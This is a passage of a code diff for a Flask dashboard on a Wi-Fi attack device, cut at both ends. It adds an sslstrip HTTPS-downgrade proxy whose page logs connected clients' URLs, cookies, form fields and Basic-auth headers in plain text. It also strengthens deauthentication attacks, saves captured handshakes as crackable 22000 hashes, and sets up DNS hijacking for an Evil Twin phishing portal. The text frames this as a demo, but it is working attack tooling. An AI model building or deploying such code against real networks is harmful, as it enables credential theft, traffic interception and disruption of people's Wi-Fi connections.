         return jsonify({'ok': False, 'error': 'action must be on or off'})
     try:
+        if strip_active() and (
+                (feature == 'internet' and action == 'off') or
+                (feature == 'dns-hijack' and action == 'on') or
+                (feature == 'portal-redirect' and action == 'on')):
+            # Both of those want port 80 (or every hostname) and would silently
+            # break the downgrade, so take the proxy down first.
+            try:
+                subprocess.run([STRIP_HELPER, 'off'], capture_output=True,
+                               text=True, timeout=40)
+                audit('HTTPS downgrade stopped: conflicts with %s' % feature)
+            except (OSError, subprocess.SubprocessError):
+                pass
         if feature == 'internet':
             subprocess.run(['/usr/local/bin/pinapple-internet', action],
                            check=True, timeout=25)
@@ -2232,6 +2717,398 @@ def api_toggle(feature):
     except Exception as e:
         audit('Network toggle %s failed: %s' % (feature, e), 'error')
         return jsonify({'ok': False, 'error': str(e)})
+
+# ---- HTTPS downgrade (sslstrip) ------------------------------------------
+
+def strip_active():
+    """Cheap check for the overview: is the proxy process alive?"""
+    try:
+        with open(STRIP_PID) as handle:
+            pid = int(handle.read().strip() or 0)
+    except (OSError, ValueError):
+        return False
+    if pid <= 0:
+        return False
+    if os.name != 'posix':
+        return True          # sig 0 would terminate the process on Windows
+    try:
+        os.kill(pid, 0)
+        return True
+    except OSError:
+        return False
+
+
+def strip_status():
+    """Live state from the helper. Never raises."""
+    data = {}
+    try:
+        result = subprocess.run([STRIP_HELPER, 'status', '--json'],
+                                capture_output=True, text=True, timeout=15)
+        loaded = json.loads(result.stdout or '{}')
+        if isinstance(loaded, dict):
+            data = loaded
+    except (OSError, ValueError, subprocess.SubprocessError):
+        data = {}
+    data.setdefault('running', False)
+    data.setdefault('mode', 'block')
+    data.setdefault('port', 10000)
+    data.setdefault('blocked_tls', 0)
+    data.setdefault('prereqs', {})
+    return data
+
+
+def strip_records(limit=150):
+    """Newest jsonl records, oldest first."""
+    try:
+        with open(STRIP_JSONL, 'rb') as handle:
+            handle.seek(0, os.SEEK_END)
+            size = handle.tell()
+            handle.seek(max(0, size - max(128 * 1024, limit * 1200)))
+            raw = handle.read().decode('utf-8', 'replace')
+    except OSError:
+        return []
+    records = []
+    for line in raw.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        try:
+            item = json.loads(line)
+        except ValueError:
+            continue
+        if isinstance(item, dict):
+            records.append(item)
+    return records[-limit:]
+
+
+def strip_host_summary(records):
+    """One row per host: requests, forms and whether it had to be downgraded."""
+    hosts = {}
+    for rec in records:
+        host = str(rec.get('host') or '')
+        if not host:
+            # Older or hand-edited records may only carry the URL.
+            url = str(rec.get('url') or '')
+            if '://' in url:
+                host = url.split('://', 1)[1].split('/', 1)[0].split('?', 1)[0]
+        if not host:
+            continue
+        item = hosts.setdefault(host, {'host': host, 'requests': 0, 'https': 0,
+                                       'forms': 0, 'last': ''})
+        item['requests'] += 1
+        if rec.get('upstream') == 'https':
+            item['https'] += 1
+        if rec.get('fields'):
+            item['forms'] += 1
+        item['last'] = str(rec.get('ts') or item['last'])
+    out = sorted(hosts.values(), key=lambda x: x['last'], reverse=True)
+    for item in out:
+        item['verdict'] = 'downgraded' if item['https'] else 'plain http'
+    return out
+
+
+def strip_rows_html(records):
+    if not records:
+        return ('<tr><td colspan="6" style="color:var(--dim)">No requests yet. '
+                'Start the downgrade, join the AP and open a plain-http site or '
+                'a site that is not HSTS-preloaded.</td></tr>')
+    rows = []
+    for rec in reversed(records):
+        fields = rec.get('fields') or {}
+        pairs = ['%s=%s' % (k, str(v)[:90]) for k, v in list(fields.items())[:5]]
+        preview = ('<div class="hint" style="margin:4px 0 0">%s</div>'
+                   % html_escape('  '.join(pairs))) if pairs else ''
+        note = str(rec.get('note') or '')
+        if rec.get('error'):
+            note = str(rec['error'])
+        note_html = ('<div class="hint" style="margin:4px 0 0">%s</div>'
+                     % html_escape(note[:160])) if note else ''
+        upstream = str(rec.get('upstream') or 'http')
+        ucls = 'bb' if upstream == 'https' else 'bw'
+        status = str(rec.get('status') or '')
+        scls = 'br' if status.isdigit() and int(status) >= 500 else 'bg'
+        ts = str(rec.get('ts') or '')
+        rows.append(
+            '<tr><td data-label="Time"><code>%s</code></td>'
+            '<td data-label="Client"><code>%s</code></td>'
+            '<td data-label="Method"><span class="badge %s">%s</span></td>'
+            '<td data-label="URL" style="word-break:break-all"><code>%s</code>%s%s</td>'
+            '<td data-label="Upstream"><span class="badge %s">%s</span></td>'
+            '<td data-label="Status"><span class="badge %s">%s</span></td></tr>' % (
+                html_escape(ts[11:] or ts), html_escape(str(rec.get('client') or '')),
+                'bb' if str(rec.get('method')) == 'POST' else 'bw',
+                html_escape(str(rec.get('method') or '')),
+                html_escape(str(rec.get('url') or '')), preview, note_html,
+                ucls, html_escape(upstream), scls, html_escape(status)))
+    return ''.join(rows)
+
+
+def strip_host_rows_html(hosts):
+    if not hosts:
+        return ('<tr><td colspan="4" style="color:var(--dim)">No hosts seen yet.'
+                '</td></tr>')
+    rows = []
+    for item in hosts:
+        downgraded = item['verdict'] == 'downgraded'
+        rows.append(
+            '<tr><td data-label="Host"><code>%s</code></td>'
+            '<td data-label="Requests">%d</td>'
+            '<td data-label="Forms">%d</td>'
+            '<td data-label="Verdict"><span class="badge %s">%s</span></td></tr>' % (
+                html_escape(item['host']), item['requests'], item['forms'],
+                'bg' if downgraded else 'bw', item['verdict']))
+    return ''.join(rows)
+
+
+@app.route('/strip')
+@require_auth
+def strip_page():
+    status = strip_status()
+    records = strip_records(150)
+    hosts = strip_host_summary(records)
+    running = bool(status.get('running'))
+    mode = status.get('mode') or 'block'
+    port = status.get('port') or 10000
+    blocked = int(status.get('blocked_tls') or 0)
+    prereqs = status.get('prereqs') or {}
+    clients = len({str(r.get('client')) for r in records if r.get('client')})
+    downgraded = len([h for h in hosts if h['verdict'] == 'downgraded'])
+
+    def pbadge(ok, label):
+        return ('<span class="badge %s" style="margin-right:6px">%s</span>'
+                % ('bg' if ok else 'br', html_escape(label)))
+
+    badges = (
+        pbadge(bool(prereqs.get('internet')), 'Internet passthrough') +
+        pbadge(bool(prereqs.get('dns_off')), 'DNS hijack off') +
+        pbadge(bool(prereqs.get('portal_off')), 'Portal redirect off') +
+        pbadge(bool(status.get('rules', {}).get('redirect')), 'port 80 redirected'))
+
+    dot = '<span class="sdot %s" id="st-dot"></span>' % ('on' if running else 'off')
+    rules = status.get('rules') or {}
+    stray = ('<div class="warnbox"><strong>The proxy is not running, but port 80 is '
+             'still redirected.</strong> Clients cannot browse until it is stopped. '
+             'Press <em>Stop downgrade</em> (removes the rules) or start it again.'
+             '</div>') if (not running and rules.get('redirect')) else ''
+    toggle_cls = 'btn btn-danger' if running else 'btn btn-acc'
+    toggle_label = 'Stop downgrade' if running else 'Start downgrade'
+    mode_block = ' selected' if mode == 'block' else ''
+    mode_allow = ' selected' if mode == 'allow' else ''
+    running_txt = ('<span id="st-label" style="color:var(--grn)">RUNNING</span>'
+                   if running else
+                   '<span id="st-label" style="color:var(--red)">STOPPED</span>')
+
+    c = """<div class="sh"><span class="st">HTTPS Downgrade (sslstrip)</span>
+<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
+<select id="st-mode-ctl" aria-label="HTTPS policy">
+  <option value="block"{mb}>block 443 &mdash; demo the refusal</option>
+  <option value="allow"{ma}>allow 443 &mdash; encrypted, invisible</option>
+</select>
+<button class="{tcls}" data-on="{on}" onclick="toggleStrip(this)">{tlabel}</button>
+<button class="btn btn-outline" onclick="refreshStrip(true)">Refresh</button>
+<button class="btn btn-outline" onclick="clearStrip()">Clear log</button>
+</div></div>
+{stray}
+
+<div class="cards">
+  <div class="card"><div class="card-title">Proxy</div>
+    <div class="scrd">{dot}{running}</div>
+    <div class="card-sub">port {port} &middot; https: <strong>{mode}</strong></div></div>
+  <div class="card"><div class="card-title">Requests</div>
+    <div class="card-value" id="st-req">{reqs}</div>
+    <div class="card-sub"><span id="st-clients">{clients}</span> client(s)</div></div>
+  <div class="card"><div class="card-title">Downgraded hosts</div>
+    <div class="card-value" id="st-hosts">{down}</div>
+    <div class="card-sub">served over http from TLS</div></div>
+  <div class="card"><div class="card-title">TLS refused</div>
+    <div class="card-value" id="st-blocked">{blocked}</div>
+    <div class="card-sub">{blocked_sub}</div></div>
+</div>
+
+<div style="margin-bottom:16px">{badges}</div>
+
+<div class="twrap" style="padding:14px 16px;margin-bottom:16px">
+<div class="hint" style="margin:0;line-height:1.6">
+<strong>What this sees.</strong> Every AP client's port 80 lands here, so the full URL,
+query string, cookies, form fields and Basic-auth header are logged as plain text.
+<strong>What it cannot see.</strong> Traffic a phone forces to HTTPS by itself (HSTS preload,
+Chrome's &ldquo;Always use secure connections&rdquo;, a typed https:// URL) never reaches the proxy:
+it dies at the 443 block and only increments <em>TLS refused</em>.
+</div></div>
+
+<div class="sh"><span class="st">Captured requests</span>
+  <span class="hint">newest first &middot; auto-refresh every 4s</span></div>
+<div class="twrap" style="margin-bottom:20px"><table class="resp">
+<thead><tr><th>Time</th><th>Client</th><th>Method</th><th>URL</th>
+<th>Upstream</th><th>Status</th></tr></thead>
+<tbody id="st-rows">{rows}</tbody></table></div>
+
+<div class="sh"><span class="st">Per-host outcome</span>
+  <span class="hint">use this table for the blog: rejected vs plain vs downgraded</span></div>
+<div class="twrap"><table class="resp">
+<thead><tr><th>Host</th><th>Requests</th><th>Forms</th><th>Verdict</th></tr></thead>
+<tbody id="st-host-rows">{host_rows}</tbody></table></div>
+
+<div class="twrap" style="padding:14px 16px;margin-top:16px">
+<div class="hint" style="margin:0;line-height:1.6">
+<strong>Demo checklist.</strong> Use a phone that has never visited the test site (or clear
+site data), turn off Chrome's &ldquo;Always use secure connections&rdquo;, and prefer domains that
+are not on the HSTS preload list. The first visit to an HTTPS-only site costs one extra
+request: the plain request is answered with a rewritten 301, then the page is fetched
+over TLS and returned as http. Sites that answer plain HTTP directly, and those that
+refuse to downgrade at all, show up in the two tables above.
+</div></div>""".format(
+        mb=mode_block, ma=mode_allow, tcls=toggle_cls, tlabel=toggle_label,
+        on='1' if running else '0', dot=dot, running=running_txt, port=port,
+        stray=stray,
+        mode=html_escape(mode), reqs=len(records), clients=clients,
+        down=downgraded, blocked=blocked,
+        blocked_sub=('udp + tcp 443 rejected' if mode == 'block'
+                     else '443 allowed &mdash; not visible'),
+        badges=badges, rows=strip_rows_html(records),
+        host_rows=strip_host_rows_html(hosts))
+
+    js = """<script>
+function stBadge(status){
+  const bad=/^5/.test(String(status));
+  return '<span class="badge '+(bad?'br':'bg')+'">'+esc(status)+'</span>';
+}
+async function refreshStrip(force){
+  if(!force && document.visibilityState!=='visible')return;
+  const r=await api('/api/strip','GET');
+  if(!r||!r.ok)return;
+  const s=r.status||{};
+  document.getElementById('st-rows').innerHTML=r.rows;
+  document.getElementById('st-host-rows').innerHTML=r.host_rows;
+  document.getElementById('st-req').textContent=r.counts.requests;
+  document.getElementById('st-clients').textContent=r.counts.clients;
+  document.getElementById('st-hosts').textContent=r.counts.downgraded;
+  document.getElementById('st-blocked').textContent=r.counts.blocked_tls;
+  const dot=document.getElementById('st-dot');
+  const label=document.getElementById('st-label');
+  if(dot)dot.className='sdot '+(s.running?'on':'off');
+  if(label){
+    label.textContent=s.running?'RUNNING':'STOPPED';
+    label.style.color=s.running?'var(--grn)':'var(--red)';
+  }
+  labelTables();
+}
+async function toggleStrip(btn){
+  const on=btn.dataset.on==='1';
+  if(!on && !confirm('Start the HTTPS downgrade?\\n\\nDNS Hijack and Portal Redirect are turned off so port 80 reaches the strip proxy. The AP stays up.'))return;
+  const mode=document.getElementById('st-mode-ctl').value;
+  busy(btn,true,on?'Stopping\\u2026':'Starting\\u2026');
+  const r=await api('/api/strip/'+(on?'stop':'start'),'POST',on?{}:{https:mode});
+  busy(btn,false);
+  if(r&&r.ok){
+    toast(r.changes&&r.changes.length?('Started ('+r.changes.join(', ')+')'):(on?'Stopped':'Started'),'success',5000);
+    setTimeout(function(){location.reload();},700);
+  }else{
+    toast('Error: '+((r&&r.error)||'unknown'),'error',8000);
+  }
+}
+async function clearStrip(){
+  if(!confirm('Clear the captured request log? Saved files are untouched.'))return;
+  const r=await api('/api/strip/clear','POST',{});
+  if(r&&r.ok){toast('Cleared '+(r.cleared||0)+' record(s)','success');refreshStrip(true);}
+  else toast('Could not clear: '+((r&&r.error)||'unknown'),'error',6000);
+}
+setInterval(function(){refreshStrip(false);},4000);
+</script>"""
+    return page('Intercept', c, 'strip', js)
+
+
+@app.route('/api/strip')
+@require_auth
+def api_strip():
+    records = strip_records(150)
+    hosts = strip_host_summary(records)
+    status = strip_status()
+    return jsonify({
+        'ok': True,
+        'status': status,
+        'rows': strip_rows_html(records),
+        'host_rows': strip_host_rows_html(hosts),
+        'counts': {
+            'requests': len(records),
+            'clients': len({str(r.get('client')) for r in records if r.get('client')}),
+            'downgraded': len([h for h in hosts if h['verdict'] == 'downgraded']),
+            'blocked_tls': int(status.get('blocked_tls') or 0),
+        },
+    })
+
+
+@app.route('/api/strip/start', methods=['POST'])
+@require_auth
+def api_strip_start():
+    if not os.path.exists(STRIP_HELPER):
+        return jsonify({'ok': False,
+                        'error': 'pinapple-strip is not installed; run install.sh'})
+    data = request.json or {}
+    mode = data.get('https') if data.get('https') in ('block', 'allow') else None
+    changes = []
+    # The downgrade is useless without NAT, so turn passthrough on rather than
+    # failing the demo with an error the operator has to fix by hand.
+    if not os.path.exists(FLAG_INTERNET):
+        try:
+            subprocess.run(['/usr/local/bin/pinapple-internet', 'on'],
+                           capture_output=True, timeout=25)
+            open(FLAG_INTERNET, 'w').close()
+            changes.append('internet passthrough on')
+        except (OSError, subprocess.SubprocessError):
+            pass
+    # The strip proxy and the captive portal both want port 80. Strip wins,
+    # because a portal redirect on 80 would swallow every captured request.
+    if os.path.exists(FLAG_DNS) and set_dns_hijack(False):
+        changes.append('DNS hijack off')
+    if os.path.exists(FLAG_PORTAL) and set_portal_redirect(False):
+        changes.append('portal redirect off')
+    cmd = [STRIP_HELPER, 'on']
+    if mode:
+        cmd += ['--https', mode]
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
+    except (OSError, subprocess.SubprocessError) as exc:
+        return jsonify({'ok': False, 'error': str(exc)})
+    if result.returncode != 0:
+        message = (result.stderr or result.stdout).strip() or 'helper failed'
+        return jsonify({'ok': False, 'error': message.splitlines()[-1][:300]})
+    audit('HTTPS downgrade started%s'
+          % ((' (' + ', '.join(changes) + ')') if changes else ''))
+    return jsonify({'ok': True, 'changes': changes, 'status': strip_status()})
+
+
+@app.route('/api/strip/stop', methods=['POST'])
+@require_auth
+def api_strip_stop():
+    if not os.path.exists(STRIP_HELPER):
+        return jsonify({'ok': False, 'error': 'pinapple-strip is not installed'})
+    try:
+        result = subprocess.run([STRIP_HELPER, 'off'], capture_output=True,
+                                text=True, timeout=40)
+    except (OSError, subprocess.SubprocessError) as exc:
+        return jsonify({'ok': False, 'error': str(exc)})
+    if result.returncode != 0:
+        message = (result.stderr or result.stdout).strip() or 'helper failed'
+        return jsonify({'ok': False, 'error': message.splitlines()[-1][:300]})
+    audit('HTTPS downgrade stopped')
+    return jsonify({'ok': True, 'status': strip_status()})
+
+
+@app.route('/api/strip/clear', methods=['POST'])
+@require_auth
+def api_strip_clear():
+    cleared = []
+    for path in (STRIP_LOG, STRIP_JSONL):
+        try:
+            with open(path, 'w'):
+                pass
+            cleared.append(os.path.basename(path))
+        except OSError:
+            pass
+    audit('HTTPS downgrade log cleared (%d file(s))' % len(cleared))
+    return jsonify({'ok': True, 'cleared': len(cleared)})
+
 
 @app.route('/clients')
 @require_auth
@@ -2351,7 +3228,8 @@ def api_recon_scan():
         if owner:
             label = WLAN1_OWNER_NAMES.get(owner, owner)
             return jsonify({'ok': False,
-                            'error': f'wlan1 is busy with {label}. Stop it before scanning.'})
+                            'error': f'wlan1 is busy with {label}. Stop it from the '
+                                     f'WLAN1 Attacks tab, then scan again.'})
 
         mode = get_wlan1_mode()
         if mode == 'AP':
@@ -2506,7 +3384,7 @@ def api_saved_delete():
 @require_auth
 def saved_page():
     items = saved_items()
-    colors = {'handshake':'bg', 'pmkid':'bw', 'recon':'bb', 'probes':'bb',
+    colors = {'handshake':'bg', 'pmkid':'bw', 'hash':'bg', 'recon':'bb', 'probes':'bb',
               'tracker':'bb', 'clients':'bb', 'creds':'bw'}
     cards = []
     for item in items:
@@ -2785,6 +3663,7 @@ def logs_page():
   <option value="deauth">Deauth bursts</option>
   <option value="dnsmasq">dnsmasq</option>
   <option value="creds">Credentials</option>
+  <option value="strip">HTTPS downgrade</option>
   <option value="scan">Scanner</option>
   <option value="dashboard">Dashboard (journal)</option>
 </select>
@@ -2845,10 +3724,10 @@ def api_logs_clear():
             'monitor': [os.path.join(LOG_DIR, 'monitor.log')],
             'beacon': [os.path.join(LOG_DIR, 'beacon-flood.log')],
             'dnsmasq': [os.path.join(LOG_DIR, 'dnsmasq.log')],
+            'strip': [STRIP_LOG],
             'scan': [os.path.join(LOG_DIR, 'scanner.log')],
         }.get(source)
-    if files is None:
-        return jsonify({'ok': False, 'error': 'unknown log source'})
+    if files is None:        return jsonify({'ok': False, 'error': 'unknown log source'})
     cleared = []
     base = os.path.realpath(LOG_DIR) + os.sep
     for path in files:
@@ -2885,6 +3764,7 @@ def api_logs():
             'beacon': [os.path.join(LOG_DIR, 'beacon-flood.log')],
             'dnsmasq': [os.path.join(LOG_DIR, 'dnsmasq.log')],
             'creds': [CREDS_LOG],
+            'strip': [STRIP_LOG],
             'scan': [os.path.join(LOG_DIR, 'scanner.log')],
         }.get(source, [])
     lines = []
@@ -3307,8 +4187,8 @@ def api_deauth():
     if not valid_mac(bssid) or not valid_mac(client):
         return jsonify({'ok': False, 'error': 'bssid and client must be MAC addresses'})
     try:
-        count = max(1, min(int(d.get('count', 64)), 500))
-        rate = max(1, min(int(d.get('rate', 20)), 200))
+        count = max(1, min(int(d.get('count', 120)), 500))
+        rate = max(1, min(int(d.get('rate', 25)), 200))
     except (TypeError, ValueError):
         return jsonify({'ok': False, 'error': 'count and rate must be numbers'})
     channel, error = resolve_channel(d.get('channel'), bssid)
@@ -3317,6 +4197,16 @@ def api_deauth():
     if not channel:
         return jsonify({'ok': False,
                         'error': 'channel unknown: pick a channel or scan the target network first'})
+    if channel > 14:
+        return jsonify({'ok': False,
+                        'error': 'this is a 5 GHz BSSID; wlan1 (AR9271) is 2.4 GHz '
+                                 'only and cannot deauth it. Pick the 2.4 GHz BSSID.'}), 400
+    entry = recon_entry(bssid)
+    if (entry.get('security') or {}).get('pmf') == 2:
+        return jsonify({'ok': False,
+                        'error': 'this AP requires 802.11w (PMF). Deauth frames are '
+                                 'protected management frames, so the station drops them. '
+                                 'Use the Evil Twin/handshake path instead.'}), 400
     if not os.path.exists(DEAUTH_HELPER):
         return jsonify({'ok': False, 'error': 'deauth helper is not installed'}), 500
 
@@ -3340,6 +4230,25 @@ def api_deauth():
     job_id = uuid.uuid4().hex[:8]
     os.makedirs(PCAP_DIR, exist_ok=True)
     log_path = os.path.join(PCAP_DIR, 'deauth_%s.log' % job_id)
+
+    # Prove the adapter can inject before claiming a deauth is running. The
+    # ath9k_htc TX counter does not move for injected frames, so aireplay-ng
+    # is the authoritative test (cached for two minutes).
+    inj_ok, inj_detail = verify_injection('wlan1')
+    if not inj_ok:
+        release_wlan1('deauth')
+        resume_recon_if_idle()
+        return jsonify({'ok': False,
+                        'error': 'injection test failed: %s' % inj_detail}), 502
+    # aireplay-ng may touch the channel; re-assert the target before injecting.
+    ok, msg = set_wlan1_channel(channel)
+    if not ok:
+        release_wlan1('deauth')
+        resume_recon_if_idle()
+        return jsonify({'ok': False,
+                        'error': f'Could not restore wlan1 channel: {msg}'}), 500
+
+    tx_baseline = iface_tx_packets('wlan1')
     try:
         with open(log_path, 'w') as log_handle:
             proc = subprocess.Popen(
@@ -3351,18 +4260,34 @@ def api_deauth():
         resume_recon_if_idle()
         return jsonify({'ok': False, 'error': 'could not start deauth helper: %s' % exc}), 500
 
+    time.sleep(0.4)
+    if proc.poll() is not None:
+        output = tail_file(log_path)
+        release_wlan1('deauth')
+        resume_recon_if_idle()
+        detail = (output or '').strip().splitlines()
+        return jsonify({'ok': False,
+                        'error': 'the deauth helper exited immediately: %s'
+                                 % (detail[-1] if detail else 'no output')}), 500
+    tx_moved = wait_for_tx('wlan1', tx_baseline, timeout=0.8)
+
     with _jobs_lock:
         _deauth_jobs[job_id] = {
             'mode': 'burst', 'proc': proc, 'bssid': bssid, 'client': client,
             'channel': channel, 'rate': rate, 'count': count,
+            'tx_baseline': tx_baseline, 'tx_verified': tx_moved,
+            'injection_ok': inj_ok, 'injection_detail': inj_detail,
             'started': datetime.datetime.now().isoformat(timespec='seconds'),
             'started_epoch': time.time(), 'log': log_path,
         }
-    audit('Deauth burst started: %s -> %s, %d frames at %d pps (ch %s)'
-          % (bssid, client, count, rate, channel or 'auto'))
+    audit('Deauth burst started: %s -> %s, %d frames at %d pps (ch %s, injection %s)'
+          % (bssid, client, count, rate, channel or 'auto',
+             'verified' if inj_ok else 'FAILED'))
     return jsonify({'ok': True, 'status': 'started', 'job_id': job_id,
                     'bssid': bssid, 'channel': channel or None, 'rate': rate,
-                    'count': count, 'estimated_seconds': round(count / rate, 1)})
+                    'count': count, 'tx_verified': tx_moved,
+                    'injection_ok': inj_ok, 'injection_detail': inj_detail,
+                    'estimated_seconds': round(count / rate, 1)})
 
 
 @app.route('/api/wlan1/deauth/continuous/start', methods=['POST'])
@@ -3374,7 +4299,7 @@ def api_deauth_continuous_start():
     if not valid_mac(bssid) or not valid_mac(client):
         return jsonify({'status': 'error', 'message': 'bssid and client must be MAC addresses'})
     try:
-        rate = max(1, min(int(d.get('rate', 20)), 200))
+        rate = max(1, min(int(d.get('rate', 25)), 200))
     except (TypeError, ValueError):
         return jsonify({'status': 'error', 'message': 'rate must be a number'})
     channel, error = resolve_channel(d.get('channel'), bssid)
@@ -3383,6 +4308,15 @@ def api_deauth_continuous_start():
     if not channel:
         return jsonify({'status': 'error',
                         'message': 'channel unknown: pick a channel or scan the target network first'})
+    if channel > 14:
+        return jsonify({'status': 'error',
+                        'message': 'this is a 5 GHz BSSID; wlan1 (AR9271) is 2.4 GHz '
+                                   'only and cannot deauth it'})
+    entry = recon_entry(bssid)
+    if (entry.get('security') or {}).get('pmf') == 2:
+        return jsonify({'status': 'error',
+                        'message': 'this AP requires 802.11w (PMF); deauth frames will '
+                                   'be ignored. Use Evil Twin/handshake instead'})
     if not os.path.exists(DEAUTH_HELPER):
         return jsonify({'status': 'error', 'message': 'deauth helper is not installed'}), 500
 
@@ -3399,6 +4333,20 @@ def api_deauth_continuous_start():
         resume_recon_if_idle()
         return jsonify({'status': 'error', 'message': 'channel change failed: ' + msg})
 
+    inj_ok, inj_detail = verify_injection('wlan1')
+    if not inj_ok:
+        release_wlan1('deauth')
+        resume_recon_if_idle()
+        return jsonify({'status': 'error',
+                        'message': 'injection test failed: ' + inj_detail})
+    ok, msg = set_wlan1_channel(channel)
+    if not ok:
+        release_wlan1('deauth')
+        resume_recon_if_idle()
+        return jsonify({'status': 'error',
+                        'message': 'could not restore wlan1 channel: ' + msg})
+
+    tx_baseline = iface_tx_packets('wlan1')
     try:
         proc = subprocess.Popen(
             deauth_command(bssid, client, channel, rate, continuous=True),
@@ -3408,11 +4356,21 @@ def api_deauth_continuous_start():
         release_wlan1('deauth')
         resume_recon_if_idle()
         return jsonify({'status': 'error', 'message': 'could not start helper: %s' % exc}), 500
+    time.sleep(0.4)
+    if proc.poll() is not None:
+        release_wlan1('deauth')
+        resume_recon_if_idle()
+        return jsonify({'status': 'error',
+                        'message': 'the deauth helper exited immediately; '
+                                   'check that wlan1 is in monitor mode'})
+    tx_moved = wait_for_tx('wlan1', tx_baseline, timeout=0.8)
     job_id = uuid.uuid4().hex[:8]
     with _jobs_lock:
         _deauth_jobs[job_id] = {
             'mode': 'continuous', 'proc': proc, 'bssid': bssid, 'client': client,
             'channel': channel, 'rate': rate,
+            'tx_baseline': tx_baseline, 'tx_verified': tx_moved,
+            'injection_ok': inj_ok, 'injection_detail': inj_detail,
             'started': datetime.datetime.now().isoformat(timespec='seconds'),
             'started_epoch': time.time(),
         }
@@ -3421,10 +4379,12 @@ def api_deauth_continuous_start():
             f.write(str(proc.pid))
     except OSError:
         pass
-    audit('Continuous deauth started: %s -> %s at %d pps (ch %s)'
-          % (bssid, client, rate, channel or 'auto'))
+    audit('Continuous deauth started: %s -> %s at %d pps (ch %s, injection %s)'
+          % (bssid, client, rate, channel or 'auto',
+             'verified' if inj_ok else 'FAILED'))
     return jsonify({'status': 'success', 'job_id': job_id,
-                    'bssid': bssid, 'channel': channel or None, 'rate': rate})
+                    'bssid': bssid, 'channel': channel or None, 'rate': rate,
+                    'injection_ok': inj_ok, 'injection_detail': inj_detail})
 
 
 @app.route('/api/wlan1/deauth/status')
@@ -3454,11 +4414,28 @@ def api_deauth_status():
                 'started': job['started'],
                 'elapsed': int(now - job.get('started_epoch', now)),
             }
+            item['injection_ok'] = job.get('injection_ok')
+            item['injection_detail'] = job.get('injection_detail', '')
             if item['mode'] == 'burst':
                 item['estimated_seconds'] = round((job.get('count') or 0) / max(1, job['rate']), 1)
+                baseline = job.get('tx_baseline')
+                now_tx = iface_tx_packets('wlan1')
+                if baseline is not None and now_tx is not None:
+                    item['tx_delta'] = now_tx - baseline
                 if not running:
                     item['output'] = tail_file(job.get('log'))
-                    item['ok'] = job['proc'].returncode == 0
+                    item['ok'] = (job['proc'].returncode == 0 and
+                                  job.get('injection_ok') is not False)
+                    if job.get('injection_ok') is False:
+                        item['output'] = ((item.get('output') or '') +
+                                          '\nInjection test failed: %s'
+                                          % job.get('injection_detail', ''))
+            else:
+                baseline = job.get('tx_baseline')
+                now_tx = iface_tx_packets('wlan1')
+                if baseline is not None and now_tx is not None:
+                    item['tx_delta'] = now_tx - baseline
+                item['tx_verified'] = job.get('tx_verified')
             jobs.append(item)
         active = any(job['running'] for job in jobs)
     orphan = None
@@ -3581,6 +4558,26 @@ def api_handshake_start():
                         meta={'bssid': bssid, 'channel': channel,
                               'client': client, 'ssid': ssid})
                     saved_id = saved.get('id')
+                    # Also keep the 22000 form: it is what the portal uses to
+                    # verify a typed password (no wordlist, one candidate).
+                    pcap_copy = saved_path(saved)
+                    hash_path, hash_error = convert_pcap_to_22000(pcap_copy)
+                    if hash_path:
+                        hash_saved = saved_add(
+                            'hash', ssid or bssid, src_path=hash_path, ext='22000',
+                            subtitle='%s \u00b7 verifier for typed passwords' % bssid,
+                            meta={'bssid': bssid, 'ssid': ssid,
+                                  'channel': channel,
+                                  'source': 'handshake',
+                                  'pcap_saved_id': saved_id})
+                        job['hash_saved_id'] = hash_saved.get('id')
+                        output += '\nHandshake hash saved (22000) for offline verification.'
+                        try:
+                            os.remove(hash_path)
+                        except OSError:
+                            pass
+                    elif hash_error:
+                        output += '\nNo 22000 hash: %s' % hash_error
                     if saved_id:
                         try:
                             os.remove(pcap_path)
@@ -4019,7 +5016,6 @@ def api_pmkid_stop():
 
 
 # Evil Twin Routes
-PSK_HELPER = '/usr/local/bin/pinapple-psk-check'
 LAST_PSK = '/var/lib/pinapple/last_psk.json'
 _psk_lock = threading.Lock()
 _evil_twin_last = [None]
@@ -4073,48 +5069,171 @@ def ensure_active_portal():
         audit('Restored the active portal link to %s' % slug, 'warn')
 
 
-def prepare_twin_portal():
+def refresh_portal_active():
+    """Mirror the portal/DNS flags into the marker nginx reads."""
+    try:
+        if os.path.exists(FLAG_DNS) or os.path.exists(FLAG_PORTAL):
+            open(PORTAL_ACTIVE, 'w').close()
+        else:
+            try:
+                os.remove(PORTAL_ACTIVE)
+            except OSError:
+                pass
+    except OSError:
+        pass
+
+
+def set_dns_hijack(enabled, portal_ip=None):
+    """Apply the dnsmasq DNS hijack and its boot flag. Returns True on success.
+
+    DHCP option 114 (RFC 8910 captive-portal URI) is written only while the
+    hijack is on. A normal AP must not advertise the portal, or Android/iOS
+    opens the phishing page on every join even with no attack running.
+    """
+    try:
+        portal_ip = portal_ip or '10.0.0.1'
+        if enabled:
+            with open(DNSMASQ_HIJACK, 'w') as handle:
+                handle.write('address=/#/%s\n' % portal_ip)
+                handle.write('dhcp-option=114,http://%s/\n' % portal_ip)
+            open(FLAG_DNS, 'w').close()
+        else:
+            with open(DNSMASQ_HIJACK, 'w') as handle:
+                handle.write('# DNS hijack disabled\n')
+            try:
+                os.remove(FLAG_DNS)
+            except OSError:
+                pass
+        refresh_portal_active()
+        subprocess.run(['systemctl', 'restart', 'pinapple-dhcp'],
+                       capture_output=True, timeout=20)
+        return True
+    except Exception as exc:
+        audit('Could not set DNS hijack state: %s' % exc, 'error')
+        return False
+
+
+def set_portal_redirect(enabled):
+    """Apply the port-80 iptables redirect and its boot flag."""
+    try:
+        subprocess.run(['/usr/local/bin/pinapple-portal', 'on' if enabled else 'off'],
+                       capture_output=True, timeout=25)
+        if enabled:
+            open(FLAG_PORTAL, 'w').close()
+        else:
+            try:
+                os.remove(FLAG_PORTAL)
+            except OSError:
+                pass
+        refresh_portal_active()
+        return True
+    except Exception as exc:
+        audit('Could not set portal redirect state: %s' % exc, 'error')
+        return False
+
+
+def prepare_twin_portal(prefer=None):
     """Plug-and-play captive portal setup for an Evil Twin run.
 
     Points the portal at the configured template and turns on DNS hijack and
-    the HTTP redirect, so a joining phone opens the portal by itself. Returns
-    the list of things that changed (for the start response).
+    the HTTP redirect, so a joining phone opens the portal by itself. The
+    operator's previous settings are snapshotted once so they can be put back
+    when the twin stops. Returns the list of things that changed.
     """
     notes = []
     cfg = load_config()
-    slug = str(cfg.get('portal_type') or 'wifi-psk')
+    if not os.path.exists(EVILTWIN_PORTAL_STATE):
+        try:
